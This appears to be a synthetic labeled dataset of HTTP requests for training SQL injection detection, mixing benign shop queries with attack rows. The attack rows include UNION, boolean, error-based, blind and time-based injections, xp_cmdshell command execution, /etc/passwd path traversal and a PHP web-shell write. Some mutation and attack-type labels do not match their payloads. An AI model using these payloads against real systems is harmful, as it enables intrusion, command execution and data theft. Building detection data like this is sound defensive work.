timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-06-08T17:53:32Z,10.227.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--%00%00"",""min_price"":712}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/NULL,NULL,NULL)a--%00%00"",""min_price"":712}}}}",1.0,union,body_json,url_encode,p0141,0.7,dataset.csv,,,,7c15f271554c9702502e062bd7cea7a8
2025-05-17T14:16:02Z,10.96.XXX.XXX,GET,/item/2695/details,,,,GET /item/2695/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,57ee68514bdc5722bb4246a6bbf696d0
2025-10-24T00:04:26Z,10.141.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":168}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":168}}}}",0.0,,,,,0.0,dataset.csv,,,,3934e63f10deee90968e03ff6cd11b33
2025-02-20T08:03:34Z,10.234.XXX.XXX,GET,/item,"{""id"": ""book review""}",,,GET /item?id=book review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3629aeebd4cba175730f461409a54619
2025-03-04T15:01:05Z,10.22.XXX.XXX,GET,/item,"{""id"": ""book review""}",,,GET /item?id=book review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3629aeebd4cba175730f461409a54619
2025-03-03T15:18:23Z,10.167.XXX.XXX,GET,/item,"{""id"": ""book review""}",,,GET /item?id=book review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3629aeebd4cba175730f461409a54619
2025-03-01T21:35:26Z,10.131.XXX.XXX,GET,/product,"{""id"": ""Table"", ""ref"": ""car review""}",,,GET /product?id=Table&ref=car review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,91ed3cbbd0130596b677d043d1d67386
2025-03-21T19:10:35Z,10.19.XXX.XXX,GET,/product,"{""id"": ""Laptop"", ""ref"": ""83""}",,,GET /product?id=Laptop&ref=83 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8ed5f905db5a3899bbcb698a330b4364
2025-07-28T23:20:33Z,10.131.XXX.XXX,POST,/api/search,,"{{""user"":""best bag"",""query"":""admin'\nOr\n'1'='1%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""best bag"",""query"":""admin'\nOr\n'1'='1%00""}}",1.0,boolean,body_json,url_encode,p0185,0.6,dataset.csv,,,,a47c4e04f725cf6d354be72518a8a927
2025-01-10T14:11:48Z,10.106.XXX.XXX,GET,/product,"{""id"": ""desk price"", ""ref"": ""'/**/Or/**/'a'='a""}",,,GET /product?id=desk price&ref='/**/Or/**/'a'='a HTTP/1.1,1.0,boolean,query_param,hex,p0135,1.0,dataset.csv,,,,0b99f1cb0199f764ec38119026f106ad
2025-08-03T14:55:11Z,10.250.XXX.XXX,GET,/search,"{""q"": ""'%20AND%20gtid_subset(version(),1)#%00""}",,,"GET /search?q='%20AND%20gtid_subset(version(),1)#%00 HTTP/1.1",1.0,error,query_param,double_encode,p0127,0.7,dataset.csv,,,,aa2e9027a0e216ee47f8f29d09e9a703
2025-07-11T06:20:34Z,10.61.XXX.XXX,GET,/product,"{""id"": ""26"", ""ref"": ""best lamp""}",,,GET /product?id=26&ref=best lamp HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c91a7217af7d0d011f91b931e46c8af9
2025-01-27T04:28:23Z,10.207.XXX.XXX,GET,/item,"{""id"": ""1 %28%27%20Or%201%3D1#%29""}",,,GET /item?id=1 %28%27%20Or%201%3D1#%29 HTTP/1.1,1.0,boolean,query_param,whitespace_obf,p0126,0.5,dataset.csv,,,,42cafd965411922d11c6fdcf5baf8544
2025-08-16T02:23:46Z,10.194.XXX.XXX,GET,/product,"{""id"": ""9"", ""ref"": ""helmet price""}",,,GET /product?id=9&ref=helmet price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,68ab39259b6f5745315b9faa14e54ec8
2025-01-15T14:57:38Z,10.41.XXX.XXX,GET,/item/818/details,,,,GET /item/818/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,dfcc28d52921a0a512e2641dab77c17d
2025-10-26T09:38:53Z,10.117.XXX.XXX,GET,/api/data,,,"{""X-User-Data"": ""workout plans""}","GET /api/data HTTP/1.1
X-User-Data: workout plans",0.0,,,,,0.0,dataset.csv,,,,69de57f7789aa24ec5408b95eb3e7f1a
2025-07-23T07:33:22Z,10.225.XXX.XXX,GET,/product,"{""id"": ""1 '+Or+'a'='a"", ""ref"": ""sofa""}",,,GET /product?id=1 '+Or+'a'='a&ref=sofa HTTP/1.1,1.0,boolean,query_param,hex,p0170,1.0,dataset.csv,,,,ce5247c302fc6e475c085af42b01af08
2025-07-18T16:04:05Z,10.131.XXX.XXX,GET,/product,"{""id"": ""1 '\nUNION\nSeLeCt\ncolumn_name,NULL\nFROM\ninformation_schema.columns--\nAND\n1=1"", ""ref"": ""40""}",,,"GET /product?id=1 '
UNION
SeLeCt
column_name,NULL
FROM
information_schema.columns--
AND
1=1&ref=40 HTTP/1.1",1.0,union,query_param,whitespace_obf,p0120,0.5,dataset.csv,,,,6dae9cff537cce4589d05f8ab47c2178
2025-10-20T11:31:51Z,10.52.XXX.XXX,GET,/search,"{""q"": ""JyBBTkQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMSktLQ==%00%00""}",,,GET /search?q=JyBBTkQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMSktLQ==%00%00 HTTP/1.1,1.0,error,query_param,base64,p0058,1.0,dataset.csv,,,,039bfbbabb1ae1fafd1dc89034730731
2025-08-24T23:38:07Z,192.168.XXX.XXX,GET,/search,"{""q"": ""....//....//....//etc/passwd%00""}",,,GET /search?q=....//....//....//etc/passwd%00 HTTP/1.1,1.0,path-injection,query_param,none,p0118,0.2,dataset.csv,,,,589f7c492371b6659a061780cebbd419
2025-06-10T13:37:43Z,10.10.XXX.XXX,GET,/search,"{""q"": ""....//....//....//etc/passwd%00""}",,,GET /search?q=....//....//....//etc/passwd%00 HTTP/1.1,1.0,path-injection,query_param,double_encode,p0118,0.7,dataset.csv,,,,589f7c492371b6659a061780cebbd419
2025-07-26T07:17:31Z,10.169.XXX.XXX,POST,/comment,,username=best flight tickets&comment=%27%2BaNd%2BMULTipOInt%28%28SeLEcT%2B%2A%2Bfrom%2B%28SeLeCt%2B%2A%2BFrOm%2B%28seleCT%2BVersIon%28%29%29A%29B%29%29--%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best flight tickets&comment=%27%2BaNd%2BMULTipOInt%28%28SeLEcT%2B%2A%2Bfrom%2B%28SeLeCt%2B%2A%2BFrOm%2B%28seleCT%2BVersIon%28%29%29A%29B%29%29--%2500",1.0,error,body_form,base64,p0065,1.0,dataset.csv,,,,dca581f047707ca8cdba52a25b3d2f90
2025-08-21T10:36:11Z,10.11.XXX.XXX,GET,/product,"{""id"": ""car 2025"", ""ref"": ""SHOES""}",,,GET /product?id=car 2025&ref=SHOES HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,816b3229b0876d4b3ba538fd864079fd
2025-06-17T18:37:23Z,10.0.XXX.XXX,GET,/search,"{""q"": ""'\nUNION\nSeLeCt\n*\nFROM\n(SeLeCt\nNULL,NULL,NULL)a#""}",,,"GET /search?q='
UNION
SeLeCt
*
FROM
(SeLeCt
NULL,NULL,NULL)a# HTTP/1.1",1.0,union,query_param,base64,p0134,1.0,dataset.csv,,,,6e7932c2f30094a55c429b9157dae709
2025-02-16T08:35:57Z,10.129.XXX.XXX,GET,/search,"{""q"": ""'\nUNION\nSeLeCt\n*\nFROM\n(SeLeCt\nNULL,NULL,NULL)a#""}",,,"GET /search?q='
UNION
SeLeCt
*
FROM
(SeLeCt
NULL,NULL,NULL)a# HTTP/1.1",1.0,union,query_param,url_encode,p0134,0.4,dataset.csv,,,,6e7932c2f30094a55c429b9157dae709
2025-09-27T09:40:17Z,10.234.XXX.XXX,GET,/product,"{""id"": ""52"", ""ref"": ""best battery""}",,,GET /product?id=52&ref=best battery HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,2ad1a0a5d37cb59a819119e4502d1ff8
2025-08-07T10:08:16Z,10.23.XXX.XXX,POST,/comment,,username=watch review&comment=82,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=watch review&comment=82",0.0,,,,,0.0,dataset.csv,,,,e1963a6de2f8642f75332c6aeb7ef31d
2025-07-30T22:33:39Z,10.10.XXX.XXX,POST,/api/search,,"{{""user"":""Lamp"",""query"":""'/**/AND/**/SUBSTRING(user(),1,1)='r'--%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""Lamp"",""query"":""'/**/AND/**/SUBSTRING(user(),1,1)='r'--%00""}}",1.0,blind,body_json,none,p0099,0.4,dataset.csv,,,,a0bfab42e15de663b765d1aeb5cb996e
2025-04-18T07:45:27Z,10.121.XXX.XXX,GET,/product,"{""id"": ""desk price"", ""ref"": ""HELMET""}",,,GET /product?id=desk price&ref=HELMET HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,45d654785fdf87ed616f551404d8e7a5
2025-06-13T17:47:00Z,10.157.XXX.XXX,POST,/comment,,username=desk 2025&comment=flight tickets review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=desk 2025&comment=flight tickets review",0.0,,,,,0.0,dataset.csv,,,,cf71630fb568f8a643d572d1b109715e
2025-08-18T09:59:59Z,10.172.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""999' UNION SeLeCt 1,2,3,4,5,6,7,8,9,10--"",""min_price"":665}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""999' UNION SeLeCt 1,2,3,4,5,6,7,8,9,10--"",""min_price"":665}}}}",1.0,union,body_json,none,p0053,0.4,dataset.csv,,,,95ad4c6690f51d64d1902379aec717c9
2025-07-12T06:29:02Z,10.66.XXX.XXX,POST,/comment,,username=car 2025&comment=%2527%253B%2F%252A%252A%2FEXEC%2F%252A%252A%2Fmaster..xp_cmdshell%2F%252A%252A%2F%2527whoami%2527--,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=car 2025&comment=%2527%253B%2F%252A%252A%2FEXEC%2F%252A%252A%2Fmaster..xp_cmdshell%2F%252A%252A%2F%2527whoami%2527--",1.0,stacked,body_form,case_obf,p0148,0.6000000000000001,dataset.csv,,,,db930802d5827c665188692cd45ecdf1
2025-09-28T21:32:48Z,10.100.XXX.XXX,POST,/api/search,,"{{""user"":""56"",""query"":""'/**/AND/**/1=(SeLeCt/**/1/**/FROM/**/pg_sleep(5))--""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""56"",""query"":""'/**/AND/**/1=(SeLeCt/**/1/**/FROM/**/pg_sleep(5))--""}}",1.0,time-based,body_json,none,p0086,0.5,dataset.csv,,,,8f0c9499339b4fcf4329c372860b2805
2025-01-20T12:38:12Z,10.198.XXX.XXX,POST,/comment,,username=FITNESS TIPS&comment=Mysql database,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=FITNESS TIPS&comment=Mysql database",0.0,,,,,0.0,dataset.csv,,,,f89b4a7af5ed3694574f78053ab5ffa9
2025-10-21T12:10:13Z,10.152.XXX.XXX,POST,/comment,,username=%27%0AAND%0Aupdatexml%281%2Cconcat%280x7e%2Cdatabase%28%29%29%2C1%29--&comment=27,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%0AAND%0Aupdatexml%281%2Cconcat%280x7e%2Cdatabase%28%29%29%2C1%29--&comment=27",1.0,error,body_form,url_encode,p0058,0.5,dataset.csv,,,,9943d6b94fe655dd9ab025cdd9b20a68
2025-02-01T05:47:13Z,10.146.XXX.XXX,POST,/api/search,,"{{""user"":""23"",""query"":""Pants""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""23"",""query"":""Pants""}}",0.0,,,,,0.0,dataset.csv,,,,5f35393fe265f21cf164de9b4d923df9
2025-08-08T12:45:12Z,10.46.XXX.XXX,POST,/comment,,username=11&comment=PYTHON TUTORIAL,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=11&comment=PYTHON TUTORIAL",0.0,,,,,0.0,dataset.csv,,,,0d6bb13758a284997d8d9afc93275f5f
2025-09-23T12:58:02Z,10.203.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":451}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":451}}}}",0.0,,,,,0.0,dataset.csv,,,,0c631baf0cf2e31ee976cf5109d6fe65
2025-04-25T23:31:52Z,10.197.XXX.XXX,POST,/api/search,,"{{""user"":""pants"",""query"":""movie""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""pants"",""query"":""movie""}}",0.0,,,,,0.0,dataset.csv,,,,8ab49a2343019d877e978bf31cec704f
2025-05-14T15:47:19Z,10.4.XXX.XXX,GET,/search,"{""q"": ""'/**/AND/**/extractvalue(1,concat(0x7e,version()))--""}",,,"GET /search?q='/**/AND/**/extractvalue(1,concat(0x7e,version()))-- HTTP/1.1",1.0,error,query_param,none,p0057,0.2,dataset.csv,,,,193228fe7c37a18cf54497d8b3d75d0e
2025-01-25T08:51:14Z,10.249.XXX.XXX,POST,/comment,,username=best scooter&comment=best sofa,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best scooter&comment=best sofa",0.0,,,,,0.0,dataset.csv,,,,72212b508be8967f86818ced828290e4
2025-06-20T00:29:55Z,10.136.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":725}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":725}}}}",0.0,,,,,0.0,dataset.csv,,,,d1042f83b81ca57b1a2e60c732b0b8e4
2025-01-28T13:27:16Z,10.107.XXX.XXX,GET,/search,"{""q"": ""'%20AND%20gtid_subset(version(),1)--%00""}",,,"GET /search?q='%20AND%20gtid_subset(version(),1)--%00 HTTP/1.1",1.0,error,query_param,case_obf,p0165,0.5,dataset.csv,,,,49bf8ec1a1298a51340d312c462f75e8
2025-06-03T09:03:18Z,10.229.XXX.XXX,GET,/item/4461/details,,,,GET /item/4461/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e198d6a047f41c2781f8f010d8a8eade
2025-06-16T14:23:45Z,10.167.XXX.XXX,GET,/profile,,,"{""Cookie"": ""session=c7d8cc14e1fc119db782ccee32ef42c6; prefs=lang=en""}","GET /profile HTTP/1.1
Cookie: session=c7d8cc14e1fc119db782ccee32ef42c6; prefs=lang=en",0.0,,,,,0.0,dataset.csv,,,,1b6bc833e5a0517ed888746ba86c914c
2025-06-27T18:12:27Z,10.194.XXX.XXX,POST,/api/search,,"{{""user"":""tire"",""query"":""' AND LENGTH(database())>5#%00%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""tire"",""query"":""' AND LENGTH(database())>5#%00%00""}}",1.0,blind,body_json,comment_insert,p0101,0.8,dataset.csv,,,,7086fc1c3ddbeb1e50a3422cdb98d4a8
2025-05-06T07:03:57Z,10.194.XXX.XXX,POST,/api/search,,"{{""user"":""react documentation price"",""query"":""Workout plans""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""react documentation price"",""query"":""Workout plans""}}",0.0,,,,,0.0,dataset.csv,,,,937d1f47c13e9deee457b8cc1c874931
2025-08-03T07:57:56Z,10.160.XXX.XXX,POST,/api/search,,"{{""user"":""10"",""query"":""camera price""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""10"",""query"":""camera price""}}",0.0,,,,,0.0,dataset.csv,,,,540d66956b138cbea1517bad35d9de0d
2025-03-28T13:29:36Z,10.13.XXX.XXX,GET,/search,"{""q"": ""%27%20UNION%20SELECT%20NULL%2CNULL--""}",,,GET /search?q=%27%20UNION%20SELECT%20NULL%2CNULL-- HTTP/1.1,1.0,union,query_param,whitespace_obf,p0036,0.5,dataset.csv,,,,a9e2fd9aaaddf5d313ee1c8a772f7966
2025-01-07T13:17:28Z,10.21.XXX.XXX,POST,/api/search,,"{{""user"":""8"",""query"":""' UNION SeLEcT 1,'<?phP sysTEM($_GEt[\""CMd\""]); ?>',3 into OutfiLE '/Var/wWw/shelL.pHp'--""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""8"",""query"":""' UNION SeLEcT 1,'<?phP sysTEM($_GEt[\""CMd\""]); ?>',3 into OutfiLE '/Var/wWw/shelL.pHp'--""}}",1.0,union,body_json,double_encode,p0052,0.8999999999999999,dataset.csv,,,,d0393a0423d002ba731b7d46f20fcd45
2025-05-11T04:15:22Z,10.116.XXX.XXX,GET,/search,"{""q"": ""'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)--""}",,,GET /search?q='+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)-- HTTP/1.1,1.0,time-based,query_param,double_encode,p0123,0.7,dataset.csv,,,,649222dc42ffca4bbd36230a05190e52
2025-10-03T07:13:26Z,10.129.XXX.XXX,POST,/api/search,,"{{""user"":""5"",""query"":""86""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""5"",""query"":""86""}}",0.0,,,,,0.0,dataset.csv,,,,825d159ab05317c7d0481d1aa9903d2d
2025-08-24T22:22:40Z,10.142.XXX.XXX,GET,/product,"{""id"": ""best phone"", ""ref"": ""'/**/OR/**/BENCHMARK(5000000,MD5('A'))--%00""}",,,"GET /product?id=best phone&ref='/**/OR/**/BENCHMARK(5000000,MD5('A'))--%00 HTTP/1.1",1.0,time-based,query_param,none,p0075,0.2,dataset.csv,,,,0f069d17016788747d2db5219f51440c
2025-07-23T09:37:45Z,10.249.XXX.XXX,POST,/comment,,username=sofa review&comment=travel destinations,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=sofa review&comment=travel destinations",0.0,,,,,0.0,dataset.csv,,,,1dff694ad98e107071d3a06095716fe7
2025-02-22T06:07:49Z,10.199.XXX.XXX,GET,/search,"{""q"": ""(admin'%20--)""}",,,GET /search?q=(admin'%20--) HTTP/1.1,1.0,boolean,query_param,double_encode,p0196,0.7,dataset.csv,,,,e9f2a4267be14380e4682a0220f47b58
2025-10-09T09:27:08Z,10.112.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":340}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":340}}}}",0.0,,,,,0.0,dataset.csv,,,,f944e986edea3e987e8e65d55ad0e68a
2025-07-22T12:30:31Z,10.193.XXX.XXX,GET,/item,"{""id"": ""../../../etc/passwd%00""}",,,GET /item?id=../../../etc/passwd%00 HTTP/1.1,1.0,path-injection,query_param,none,p0113,0.2,dataset.csv,,,,c0e311a99dad74371f24a91449e2a044
2025-09-12T12:48:32Z,10.74.XXX.XXX,POST,/comment,,username=REACT DOCUMENTATION&comment=Watch,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=REACT DOCUMENTATION&comment=Watch",0.0,,,,,0.0,dataset.csv,,,,c5d550fc1475101adb350716d0a23e0c
2025-02-03T00:55:35Z,10.225.XXX.XXX,POST,/comment,,username=85&comment=bike review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=85&comment=bike review",0.0,,,,,0.0,dataset.csv,,,,c8a11ae4a107a8ab97879cc89a7c1f64
2025-07-19T12:16:47Z,10.203.XXX.XXX,GET,/product,"{""id"": ""best tire"", ""ref"": ""chair price""}",,,GET /product?id=best tire&ref=chair price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a7be156df28d470baf3eb6f3dddcc1d9
2025-06-11T17:16:58Z,10.136.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":747}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":747}}}}",0.0,,,,,0.0,dataset.csv,,,,3ca953c5c62963f890adfa8830123562
2025-10-07T13:47:22Z,10.192.XXX.XXX,GET,/search,"{""q"": ""'%20Or%20a=a--""}",,,GET /search?q='%20Or%20a=a-- HTTP/1.1,1.0,boolean,query_param,whitespace_obf,p0144,0.5,dataset.csv,,,,82d5ef8993c9eab5b61ed5575b8a7609
2025-03-25T09:35:04Z,10.74.XXX.XXX,POST,/comment,,username=BIKE&comment=camera price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=BIKE&comment=camera price",0.0,,,,,0.0,dataset.csv,,,,321a0ace7b9255161deb93ab4c04f177
2025-08-23T10:27:14Z,10.250.XXX.XXX,GET,/product,"{""id"": ""HOTEL BOOKING"", ""ref"": ""Excellent service""}",,,GET /product?id=HOTEL BOOKING&ref=Excellent service HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,06f7cfaf6827ae2978d527dfe143f3af
2025-07-04T16:19:25Z,10.19.XXX.XXX,POST,/comment,,username=%28%28%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27--%29%29&comment=best pants,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%28%28%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27--%29%29&comment=best pants",1.0,stacked,body_form,whitespace_obf,p0152,0.7000000000000001,dataset.csv,,,,bee2426ad435ad33b6ac567ad66b3598
2025-04-14T05:40:36Z,10.64.XXX.XXX,GET,/product,"{""id"": ""1'/**/OR/**/'1' LIKE '1%00"", ""ref"": ""pants 2025""}",,,GET /product?id=1'/**/OR/**/'1' LIKE '1%00&ref=pants 2025 HTTP/1.1,1.0,path-injection,query_param,none,p0128,0.2,dataset.csv,,,,91bc5beef2ec9a3fc76892d51456a41a
2025-06-21T13:39:06Z,10.135.XXX.XXX,GET,/product,"{""id"": ""best watch"", ""ref"": ""45""}",,,GET /product?id=best watch&ref=45 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,232fe6f1b83e811661cdeefcede973f6
2025-08-08T12:40:26Z,10.4.XXX.XXX,GET,/item/7980/details,,,,GET /item/7980/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,775cc723bc27a011da099f1c368428aa
2025-09-18T17:58:14Z,10.39.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""1%2527%2520OR%25201%253D1"",""min_price"":149}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""1%2527%2520OR%25201%253D1"",""min_price"":149}}}}",1.0,boolean,body_json,hex,p0012,1.0,dataset.csv,,,,5249bd7a457591bdca0c16d491fc1192
2025-10-05T07:16:58Z,10.205.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""1%2527%2520Or%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529#"",""min_price"":304}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""1%2527%2520Or%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529#"",""min_price"":304}}}}",1.0,time-based,body_json,double_encode,p0083,0.8999999999999999,dataset.csv,,,,55cb1a7b9146615157b2ef87ce8dccce
2025-01-31T08:04:08Z,10.32.XXX.XXX,GET,/product,"{""id"": ""battery"", ""ref"": ""phone""}",,,GET /product?id=battery&ref=phone HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d287ea5090a51f2e57fce0f72e0eeaf4
2025-01-22T05:12:34Z,10.61.XXX.XXX,POST,/comment,,username=table 2025&comment=sofa price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=table 2025&comment=sofa price",0.0,,,,,0.0,dataset.csv,,,,10ed107539876224ebd719c476920992
2025-06-08T00:44:38Z,10.66.XXX.XXX,POST,/api/search,,"{{""user"":""HEALTHY RECIPES"",""query"":""'+Or+polygon((select+*+from(select+*+from(select+version())a)b))#%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""HEALTHY RECIPES"",""query"":""'+Or+polygon((select+*+from(select+*+from(select+version())a)b))#%00""}}",1.0,error,body_json,whitespace_obf,p0066,0.7,dataset.csv,,,,e0cd35d77755ca2b5684d662f81750ed
2025-04-24T07:08:46Z,10.7.XXX.XXX,GET,/item,"{""id"": ""shirt 2025""}",,,GET /item?id=shirt 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a367338c7fe9b8260044da97079ebb75
2025-01-10T22:50:23Z,10.7.XXX.XXX,GET,/item,"{""id"": ""shirt 2025""}",,,GET /item?id=shirt 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a367338c7fe9b8260044da97079ebb75
2025-08-29T05:40:59Z,10.170.XXX.XXX,POST,/api/search,,"{{""user"":""85"",""query"":""'+aND+(Select+*+FroM+(SEleCT(sLEeP(5)))A)#%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""85"",""query"":""'+aND+(Select+*+FroM+(SEleCT(sLEeP(5)))A)#%00""}}",1.0,time-based,body_json,base64,p0155,1.0,dataset.csv,,,,462f98c7d95cb77c6d9cc5f7dbaee3c9
2025-01-23T05:02:53Z,10.195.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""'/**/AND/**/1=CONVERT(int,@@version)--%00"",""min_price"":322}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""'/**/AND/**/1=CONVERT(int,@@version)--%00"",""min_price"":322}}}}",1.0,error,body_json,double_encode,p0055,0.8999999999999999,dataset.csv,,,,3e781ce01d668e62eb22cd59696e2cd1
